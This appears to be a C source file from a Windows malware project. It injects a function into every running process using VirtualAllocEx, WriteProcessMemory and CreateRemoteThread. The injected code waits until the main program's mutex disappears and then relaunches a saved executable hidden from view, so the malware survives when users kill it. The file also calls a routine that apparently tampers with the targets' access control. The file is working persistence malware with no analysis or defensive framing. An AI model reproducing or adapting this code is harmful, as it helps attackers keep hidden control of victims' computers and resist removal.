#include "../Includes/includes.h"

#ifdef INCLUDE_INJECTION
static INT WINAPI Injected_Function(LPINJECTINFO pstInjectData) //szInjectedProcessMutex
{
    if (pstInjectData == NULL || pstInjectData->wSizeOf != sizeof(INJECTINFO))
        return NULL;

    typedef HMODULE (__stdcall *vLoadLibraryA)(LPCTSTR lpFileName);
    typedef FARPROC WINAPI (__stdcall *vGetProcAddress)(HMODULE hModule, LPCSTR lpProcName);

    //typedef int WINAPI (__stdcall *vMessageBoxA)(HWND hWnd, LPCTSTR lpText, LPCTSTR lpCaption, UINT uType);
    typedef DWORD (__stdcall *vNtTerminateProcess)(HANDLE ProcessHandle, DWORD ExitStatus);
    typedef HANDLE WINAPI (__stdcall *vOpenMutexA)(DWORD dwDesiredAccess, BOOL bInheritHandle, LPCTSTR lpName);
    //typedef HANDLE WINAPI (__stdcall *vCreateMutexA)(LPSECURITY_ATTRIBUTES lpMutexAttributes, BOOL bInitialOwner, LPCTSTR lpName);
    //typedef BOOL WINAPI (__stdcall *vReleaseMutex)(HANDLE hMutex);
    typedef BOOL WINAPI (__stdcall *vCloseHandle)(HANDLE hObject);
    typedef VOID WINAPI (__stdcall *vSleep)(DWORD dwMilliseconds);
    typedef HINSTANCE (__stdcall *vShellExecuteA)(HWND hwnd, LPCTSTR lpOperation, LPCTSTR lpFile, LPCTSTR lpParameters, LPCTSTR lpDirectory, INT nShowCmd);
    //typedef DWORD WINAPI (__stdcall *vGetLastError)(void);

    vLoadLibraryA fLoadLibraryA = (vLoadLibraryA)pstInjectData->dwLoadLibraryA;
    vGetProcAddress fGetProcAddress = (vGetProcAddress)pstInjectData->dwGetProcAddress;

    //vMessageBoxA fMessageBoxA = (vMessageBoxA)fGetProcAddress(fLoadLibraryA(pstInjectData->szUser32Name), pstInjectData->szMessageBoxAName);
    vNtTerminateProcess fNtTerminateProcess = (vNtTerminateProcess)fGetProcAddress(fLoadLibraryA(pstInjectData->szNtDllName), pstInjectData->szNtTerminateProcessName);
    vOpenMutexA fOpenMutexA = (vOpenMutexA)fGetProcAddress(fLoadLibraryA(pstInjectData->szKernel32Name), pstInjectData->szOpenMutexAName);
    //vCreateMutexA fCreateMutexA = (vCreateMutexA)fGetProcAddress(fLoadLibraryA(pstInjectData->szKernel32Name), pstInjectData->szCreateMutexAName);
    //vReleaseMutex fReleaseMutex = (vReleaseMutex)fGetProcAddress(fLoadLibraryA(pstInjectData->szKernel32Name), pstInjectData->szReleaseMutexName);
    vCloseHandle fCloseHandle = (vCloseHandle)fGetProcAddress(fLoadLibraryA(pstInjectData->szKernel32Name), pstInjectData->szCloseHandleName);
    vSleep fSleep = (vSleep)fGetProcAddress(fLoadLibraryA(pstInjectData->szKernel32Name), pstInjectData->szSleepName);
    vShellExecuteA fShellExecuteA = (vShellExecuteA)fGetProcAddress(fLoadLibraryA(pstInjectData->szShell32Name), pstInjectData->szShellExecuteAName);
    //vGetLastError fGetLastError = (vGetLastError)(fGetProcAddress(fLoadLibraryA(pstInjectData->szKernel32Name), pstInjectData->szGetLastErrorName));

    //fMessageBoxA(NULL, pstInjectData->szInjectedProcessMutex, NULL, MB_OK);

    HANDLE hMutex = NULL;

    while(true)
    {
        hMutex = fOpenMutexA(MUTEX_ALL_ACCESS, FALSE, pstInjectData->szUninstallationMutexValue);
        if(hMutex != NULL)
        {
            fCloseHandle(hMutex);
            break;
        }
        fCloseHandle(hMutex);

        fSleep(pstInjectData->dwDelay);

        bool bMainProgramEnded = FALSE;

        hMutex = fOpenMutexA(MUTEX_ALL_ACCESS, FALSE, pstInjectData->szMainInstanceMutexValue);
        if(hMutex == NULL)
            bMainProgramEnded = TRUE;
        fCloseHandle(hMutex);

        if(bMainProgramEnded)
        {
            hMutex = fOpenMutexA(MUTEX_ALL_ACCESS, FALSE, pstInjectData->szMainInstanceMutexValue);
            if(hMutex == NULL)
                fShellExecuteA(NULL, NULL, pstInjectData->szSavedFilePath, NULL, NULL, SW_HIDE); //SW_SHOW
            fCloseHandle(hMutex);

            break;
        }

        fSleep(2500);
    }

    //fNtTerminateProcess((HANDLE)-1, 0);

    return 1;
}
static __declspec() void __endOfInjected_Function_Marker()
{
    asm("nop");
}

bool InjectFunctionIntoTarget(DWORD dwPid, LPTSTR szMutexProcessInject, int nWaitTime)
{
    bool bReturn = FALSE;

    RemoteDaclProtection(dwPid);

    HMODULE hmKernel32 = GetModuleHandleA("kernel32.dll");

    INJECTINFO stInjectData;
    stInjectData.wSizeOf          = sizeof(INJECTINFO);
    stInjectData.dwParam          = NULL;
    stInjectData.dwGetProcAddress = (DWORD)GetProcAddress(hmKernel32, "GetProcAddress");
    stInjectData.dwLoadLibraryA   = (DWORD)GetProcAddress(hmKernel32, "LoadLibraryA");

    lstrcpyA(stInjectData.szUser32Name, "user32.dll");
    lstrcpyA(stInjectData.szMessageBoxAName, "MessageBoxA");

    lstrcpyA(stInjectData.szNtDllName, "ntdll.dll");
    lstrcpyA(stInjectData.szNtTerminateProcessName, "NtTerminateProcess");

    lstrcpyA(stInjectData.szKernel32Name, "Kernel32.dll");
    lstrcpyA(stInjectData.szOpenMutexAName, "OpenMutexA");
    //lstrcpyA(stInjectData.szCreateMutexAName, "CreateMutexA");
    //lstrcpyA(stInjectData.szReleaseMutexName, "ReleaseMutex");
    lstrcpyA(stInjectData.szCloseHandleName, "CloseHandle");
    lstrcpyA(stInjectData.szSleepName, "Sleep");
    //lstrcpyA(stInjectData.szGetLastErrorName, "GetLastError");

    lstrcpyA(stInjectData.szShell32Name, "Shell32.dll");
    lstrcpyA(stInjectData.szShellExecuteAName, "ShellExecuteA");

    lstrcpyA(stInjectData.szInjectedProcessMutex, szMutexProcessInject);
    lstrcpyA(stInjectData.szMainInstanceMutexValue, cMainProcessMutex);
    lstrcpyA(stInjectData.szUninstallationMutexValue, cUninstallProcessMutex);
    //lstrcpyA(stInjectData.szBackupMutex, cBackupProcessMutex);

    lstrcpyA(stInjectData.szSavedFilePath, cFileSaved);
    //lstrcpyA(stInjectData.szSavedFilePath, cThisFile); //JUST FOR DEBUG PURPOSES

    stInjectData.dwDelay = (nWaitTime + 1) * 3000;

    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION|PROCESS_VM_OPERATION|PROCESS_VM_WRITE|PROCESS_CREATE_THREAD, FALSE, dwPid);
    DWORD dwFuncSize = ((DWORD)__endOfInjected_Function_Marker - (DWORD)Injected_Function);
    if(dwFuncSize != 0 && hProcess != NULL)
    {
        DWORD  dwOldAttrib             = NULL;
        DWORD  dwRemoteAllocMemorySize = dwFuncSize + sizeof(stInjectData) + sizeof(DWORD);
        LPVOID vpRemoteMemory          = VirtualAllocEx(hProcess, NULL, dwRemoteAllocMemorySize, MEM_RESERVE|MEM_COMMIT, PAGE_READWRITE);
        if(vpRemoteMemory != NULL)
        {
            if(WriteProcessMemory(hProcess, vpRemoteMemory, (LPCVOID)Injected_Function, dwFuncSize, NULL))
            {
                LPINJECTINFO pstRemoteStructAddr = (LPINJECTINFO)((BYTE*)vpRemoteMemory + dwFuncSize);
                if(WriteProcessMemory(hProcess, (LPVOID)pstRemoteStructAddr, (LPCVOID)&stInjectData, sizeof(stInjectData), NULL))
                {
                    if(VirtualProtectEx(hProcess, vpRemoteMemory, dwRemoteAllocMemorySize, PAGE_EXECUTE_READWRITE, &dwOldAttrib))
                    {
                        DWORD dwThreadId = NULL;
                        if(CreateRemoteThread(hProcess, NULL, NULL, (LPTHREAD_START_ROUTINE)vpRemoteMemory, (LPVOID)pstRemoteStructAddr, NULL, &dwThreadId) != NULL)
                            bReturn = TRUE;
                    }
                }
            }
        }
    }

    return bReturn;
}

int InjectAllProcesses()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    int nSuccesses = 0;
    int nExisting = 0;

    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if(!Process32First(hProcessSnap, &pe32))
    {
        //printf("Failed to find first process!\n");
        return 0;
    }

    do
    {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID);

        //if(!Is64Bits(hProcess))
        //{
        char cPidPath[MAX_PATH];
        memset(cPidPath, 0, sizeof(cPidPath));

        if(GetPathFromPid(pe32.th32ProcessID, cPidPath) == 0)
            strcpy(cPidPath, "?");

        char cMutexRemoteProcess[DEFAULT];
        memset(cMutexRemoteProcess, 0, sizeof(cMutexRemoteProcess));
        sprintf(cMutexRemoteProcess, "MUTEX_%s_%ld", cFileHash, pe32.th32ProcessID);

        //if(strcmp(cPidPath, "C:\\Program Files (x86)\\Notepad++\\notepad++.exe") == 0)
        if(strcmp(cPidPath, cThisFile) != 0)
        {
            if(!CheckProgramMutexExistance(cMutexRemoteProcess))
            {
                //printf("Mutex: \'%s\' does not exist\n", cMutexRemoteProcess);

                if(InjectFunctionIntoTarget(pe32.th32ProcessID, cMutexRemoteProcess, nSuccesses))
                {
                    //HANDLE hCreatedMutex = CreateMutexA(NULL, TRUE, cMutexRemoteProcess);
                    //HANDLE hRemoteMutex = NULL;
                    //HANDLE hRemoteProcess = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pe32.th32ProcessID);
                    //DuplicateHandle(GetCurrentProcess(), hCreatedMutex, hRemoteProcess, &hRemoteMutex, NULL, FALSE, DUPLICATE_SAME_ACCESS);
//...
                    //HANDLE hCreatedBackupMutex = CreateMutexA(NULL, TRUE, cMutexRemoteProcess);
                    //if(hCreatedBackupMutex != NULL)
                    //{
                    //    HANDLE hRemoteBackupMutex = NULL;
                    //    DuplicateHandle(GetCurrentProcess(), hCreatedBackupMutex, hRemoteProcess, &hRemoteBackupMutex, NULL, FALSE, DUPLICATE_SAME_ACCESS);
                    //}
                    //CloseHandle(hRemoteProcess);

                    //printf("Successfully injected into process: %s (PID: %ld)\n", cPidPath, pe32.th32ProcessID);
                    nSuccesses++;
                }
                else
                {
                    //printf("Failed to inject into process: %s (PID: %ld)\n", cPidPath, pe32.th32ProcessID);
                }
            }
            else
            {
                //printf("Mutex: \'%s\' exists\n", cMutexRemoteProcess);
                nExisting++;
            }
        }

        CloseHandle(hProcess);
    }
    while(Process32Next(hProcessSnap, &pe32));
    CloseHandle(hProcessSnap);

    //char szOutput[DEFAULT];
    //memset(szOutput, 0, sizeof(szOutput));
    //sprintf(szOutput, "Total Injection Successes: %i", nSuccesses);
    //MessageBoxA(NULL, szOutput, NULL, MB_OK);

    if(nSuccesses == 0 && nExisting == 0)
        return -1;

    //printf("------------------\nTotal Injection Successes: %i\n", nSuccesses);
    //system("pause");
    return nSuccesses;
}
#endif
